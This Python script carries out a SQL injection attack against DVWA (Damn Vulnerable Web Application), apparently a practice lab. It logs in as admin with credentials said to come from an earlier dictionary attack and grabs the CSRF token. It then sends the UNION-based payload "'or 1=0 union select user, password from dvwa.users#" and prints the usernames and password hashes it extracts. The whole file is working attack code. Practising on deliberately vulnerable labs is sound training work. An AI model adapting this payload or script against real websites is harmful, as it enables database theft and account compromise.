from bs4 import BeautifulSoup as bs
import re
import requests


# Target url for injection
target_url = 'http://localhost/vulnerabilities/sqli/'

# For the next attacks, it is supposed, the admin/password is
# already hacked with dictionary_attack_login.py
login_url = 'http://localhost/login.php'
payload = {
    'username': 'admin',
    'password': 'password',
    'Login': 'Login'
}

# Open a new session to extract the links (possible targets)
with requests.Session() as session:
    # Get the login url
    r = session.get(login_url)
    
    # Extract user token
    token = re.search("user_token'\s*value='(.*?)'", r.text).group(1)
    payload['user_token'] = token

    # Login in the webpage
    p = session.post(login_url, data=payload)

    # Reach the vulnerable page
    injection_payload = {
        'id': "'or 1=0 union select user, password from dvwa.users#",
        'Submit': 'Submit'
    }
    injection_request = session.post(target_url, data=injection_payload)

    # We should get the <pre> anchors which contains the results (with beatifulsoup)
    # Parse request p into tree
    tree = bs(injection_request.text, 'html.parser')

    # Find all a anchor elements
    for disclosure in tree.find_all('pre'):
        name = re.search(r"name:(.*?)Surname", disclosure.text).group(1)
        password = re.search(r"Surname:(.*?)$", disclosure.text).group(1)
        print(f"{name}:{password}")
    